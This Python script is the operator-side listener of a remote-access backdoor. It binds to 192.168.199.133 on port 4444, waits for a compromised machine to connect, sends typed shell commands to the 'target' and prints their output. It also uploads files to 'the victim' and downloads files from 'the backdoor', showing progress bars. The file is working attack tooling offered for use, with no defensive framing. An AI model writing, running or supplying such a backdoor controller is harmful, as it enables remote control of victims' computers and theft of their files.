import os.path
import socket
from tqdm import tqdm



def handle_command(client_socket):
    while True:
        # Receive commands from the user
        command = input("Enter a command: ")
        client_socket.sendall(command.encode())

        if command.lower() == "exit":
            print("Closing connection...")
            client_socket.close()
            server_socket.close()
            break

        elif command.lower() == "download":
                receive_file(client_socket)

        elif command.lower() == "upload":
                upload_file(client_socket)
        else:
            # For regular commands, print the output received from the target
            output = client_socket.recv(4096).decode()
            print(output)
 #Upload Function
def upload_file(client_socket):

 #Input the file name
 filename = input("Input the Filename: ")
 client_socket.send(filename.encode('utf-8'))

 if os.path.exists(filename):

     # Get the size of the file
     file_size = os.path.getsize(filename)
     print(f"Sending file: {filename} of size {file_size} bytes")

     # Send the file size to the victim
     client_socket.sendall(str(file_size).encode('utf-8'))
     with open(filename, 'rb') as file:
         bytes_sent = 0
         with tqdm(total=file_size, unit='B', unit_scale=True, desc=f"Sending {filename}") as pbar:
             while bytes_sent < file_size:
                 chunk = file.read(1024)
                 client_socket.sendall(chunk)
                 bytes_sent += len(chunk)
                 pbar.update(len(chunk))
         print(f"File '{filename}' sent successfully. Total bytes sent: {bytes_sent}")
         handle_command(client_socket)

 else:
     print("File not found!")
     handle_command(client_socket)


# Function to receive file from the backdoor
def receive_file(client_socket):
    filename = input("Input the Filename: ")
    client_socket.send(filename.encode('utf-8'))

    msg = client_socket.recv(1024) #Receive the message from the backdoor to check the file exist or not
    if msg.decode('utf-8') == "File not found":
        print(msg)
        handle_command(client_socket)

    elif msg.decode('utf-8') == "File exists": #If the file exists start download
        print(msg)
        file_size = int(client_socket.recv(1024).decode('utf-8')) #Get the file size of the file
        bytes_received = 0

        with open(filename, 'wb') as file:  # Open the file to save it locally
         with tqdm(total=file_size, unit='B', unit_scale=True, desc=f"Uploading {filename}") as pbar:
            while bytes_received < file_size:
               chunk = client_socket.recv(1024)

               file.write(chunk)

               bytes_received += len(chunk)
               pbar.update(len(chunk))
               print(f"Received {bytes_received}/{file_size} bytes")

        print(f"File {filename} received successfully. Total bytes received: {bytes_received}")
        handle_command(client_socket)




# Set up the server
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #Reuse the address
server_socket.bind(('192.168.199.133', 4444))  # Change to your IP and desired port
server_socket.listen(1)

print("Server listening...")

# Accept incoming connections
client_socket, address = server_socket.accept()
print(f"Connection from {address}")

# Start handling commands
handle_command(client_socket)

client_socket.close()
server_socket.close()